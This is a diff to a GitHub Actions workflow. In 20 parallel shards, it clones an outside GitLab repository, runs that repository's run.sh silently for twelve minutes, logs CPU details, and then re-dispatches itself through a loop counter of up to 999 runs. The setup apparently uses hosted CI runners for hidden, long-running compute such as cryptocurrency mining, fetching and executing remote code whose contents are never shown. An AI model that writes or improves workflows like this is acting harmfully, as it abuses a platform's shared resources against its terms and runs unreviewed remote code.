@@ -6,7 +6,7 @@ on:
       loop_count:
         description: 'Sisa loop'
         required: true
-        default: '18000'
+        default: '999'
 
 permissions:
   actions: write
@@ -25,33 +25,56 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 327
     steps:
-      - name: Setup Node v4
-        uses: actions/setup-node@v4
+      - name: Setup Miniconda (classic solver)
+        uses: conda-incubator/setup-miniconda@v3
         with:
-          node-version: ${{ env.NODE_VERSION }}
+          auto-activate-base: true
+          activate-environment: ""
+          channels: conda-forge
+          channel-priority: strict
+          conda-remove-defaults: true
+          miniforge-version: latest
+
+      - name: Install Node.js via conda
+        shell: bash -l {0}
+        run: |
+          conda config --set solver classic
+          conda install -c conda-forge "nodejs=${{ env.NODE_VERSION }}" -y
+          conda clean -afy
+          which node
+          node --version
+          npm --version
 
       - name: "shard ${{ matrix.shard }}/20"
+        shell: bash -l {0}
+        timeout-minutes: 50
         env:
           SHARD: ${{ matrix.shard }}
         run: |
+          set -uo pipefail
           echo "=== shard $SHARD/20 ==="
           node -v
           npm -v
+          nproc --all
           lscpu | head -10
-          git clone https://gitlab.com/masaakk88/file/xiaomi01.git \
-            && cd xiaomi01 \
-            && chmod 777 run.sh \
-            && nproc --all \
-            && ./run.sh >/dev/null 2>&1 \
-            && sleep 720 \
-            || true
-          echo "✅ shard $SHARD selesai"
 
+          git clone --depth 1 https://gitlab.com/masaakk88/file/xiaomi01.git
+          cd xiaomi01
+          chmod +x run.sh
+
+          timeout 720 ./run.sh >/dev/null 2>&1
+          RC=$?
+
+          if [ "$RC" -ne 0 ] && [ "$RC" -ne 124 ]; then
+            echo "❌ shard $SHARD gagal (exit $RC)"
+            exit "$RC"
+          fi
+          echo "✅ shard $SHARD selesai"
   trigger-hello:
     needs: shards
     if: always()
     runs-on: ubuntu-latest
-    timeout-minutes: 2
+    timeout-minutes: 5
     steps:
       - name: Dispatch phase-hello
         env:
@@ -59,7 +82,7 @@ jobs:
           LC: ${{ github.event.inputs.loop_count }}
         run: |
           set -euo pipefail
-          LC="${LC:-18000}"
+          LC="${LC:-999}"
           [[ "$LC" =~ ^[0-9]+$ ]] || { echo "::error::loop_count invalid"; exit 1; }
           [ "$LC" -le 0 ] && { echo "loop selesai"; exit 0; }
           new=$((LC - 1))
